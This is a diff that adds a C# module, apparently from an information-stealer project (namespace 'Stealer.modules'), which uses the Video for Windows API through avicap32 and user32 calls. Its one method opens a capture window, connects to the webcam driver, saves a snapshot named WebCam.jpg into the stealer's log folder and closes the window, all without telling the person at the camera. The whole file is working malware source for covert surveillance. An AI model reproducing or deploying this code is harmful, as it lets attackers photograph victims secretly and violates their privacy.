@@ -1,0 +1,38 @@
+using System.Runtime.InteropServices;
+using System;
+
+namespace Stealer.modules
+{
+  internal class WebCam
+  {
+	[DllImport("avicap32.dll")]
+        public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
+
+        [DllImport("user32")]
+        public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+
+        internal static void GetWebCamPicture()
+        {
+			string pathToLogs = Program.path;
+            IntPtr intPtr = Marshal.StringToHGlobalAnsi(pathToLogs + "\\WebCam.jpg");
+            IntPtr hWnd = capCreateCaptureWindowA("VFW Capture", -1073741824, 0, 0, 640, 480, 0, 0);
+            SendMessage(hWnd, 1034u, 0, 0);
+            SendMessage(hWnd, 1034u, 0, 0);
+            SendMessage(hWnd, 1049u, 0, intPtr.ToInt32());
+            SendMessage(hWnd, 1035u, 0, 0);
+            SendMessage(hWnd, 16u, 0, 0);
+        }
+
+        private const int WM_CAP_DRIVER_CONNECT = 1034;
+
+        private const int WM_CAP_DRIVER_DISCONNECT = 1035;
+
+        private const int WS_CHILD = 1073741824;
+
+        private const int WS_POPUP = -2147483648;
+
+        private const int WM_CAP_SAVEDIB = 1049;
+
+    private const int WM_CLOSE = 16;
+  }
+}
